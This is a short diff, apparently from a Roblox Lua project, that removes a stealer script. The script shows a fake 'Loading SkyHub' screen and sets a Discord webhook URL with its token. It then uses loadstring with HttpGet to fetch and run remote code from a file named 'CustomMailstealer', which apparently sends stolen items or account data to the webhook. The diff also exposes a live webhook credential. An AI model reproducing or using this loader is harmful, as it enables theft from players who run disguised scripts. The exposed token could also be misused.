@@ -1,7 +1,0 @@
-Username = "essaieno3"
-Webhook = "https://discord.com/api/webhooks/1207442205564866580/30aSSue120Ko4XiYBoXNBtiKwlhddWXaaFsQzGftP972pjvGB3IMd0Do6yxXgz604hGu"
-
-G_LoadingScreen = "Loading SkyHub,Please Wait"
-G_WebhookName = "ezmail"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
